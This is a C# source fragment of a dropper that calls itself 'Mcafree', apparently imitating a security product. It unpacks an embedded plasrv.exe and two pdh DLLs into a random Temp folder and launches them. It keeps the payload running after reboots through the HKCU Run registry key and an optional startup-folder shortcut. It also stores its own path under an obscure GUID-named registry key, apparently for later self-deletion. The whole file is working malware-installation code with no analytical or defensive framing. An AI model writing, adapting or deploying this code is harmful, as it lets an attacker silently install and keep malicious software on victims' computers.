// Exe to embbed exe & dll
        static void Main(string[] args)
        {
            Guid myuuid = Guid.NewGuid();
            string myuuidAsString = myuuid.ToString();
            String userProfileDirectory = System.Environment.GetEnvironmentVariable("USERPROFILE");
            String dirToExtract = userProfileDirectory + "\\AppData\\Local\\Temp\\" + myuuidAsString;
            System.IO.Directory.CreateDirectory(dirToExtract);
            extract("Mcafree", dirToExtract + "\\", "plasrv.exe");
            extract("Mcafree", dirToExtract + "\\", "pdh.dll");
            extract("Mcafree", dirToExtract + "\\", "pdh1.dll");
            persistence(dirToExtract + "\\" + "plasrv.exe");
            String currentDirectory = Environment.CurrentDirectory + "\\Mcafree.exe";
            writeToDelete(currentDirectory);
            Process.Start(dirToExtract + "\\" + "plasrv.exe");
        }
        private static void extract(string nameSpace, string outDirectory, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();
            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private static void persistence(String filePath)
        {
            // add the file to the registry key to execute on startup
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(Path.GetFileNameWithoutExtension(filePath), filePath);
        }
        private static void writeToDelete(String exePath)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Classes", true);
            key.CreateSubKey("87983e9e-fe92-11ed-be56-0242ac120002");
            key = key.OpenSubKey("87983e9e-fe92-11ed-be56-0242ac120002", true);
            key.SetValue("4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", exePath);
        }
        private static void moveToStartup(String exePath)
        {
            WshShell wshShell = new WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut;
            string startUpFolderPath =
              Environment.GetFolderPath(Environment.SpecialFolder.Startup);

            // Create the shortcut
            shortcut =
              (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut(
                startUpFolderPath + "\\" +
                 "plasrv.lnk");
            shortcut.TargetPath = exePath;
            shortcut.WorkingDirectory = startUpFolderPath;
            shortcut.Description = "Launch My Application";
            // shortcut.IconLocation = Application.StartupPath + @"\App.ico";
            shortcut.Save();
        }
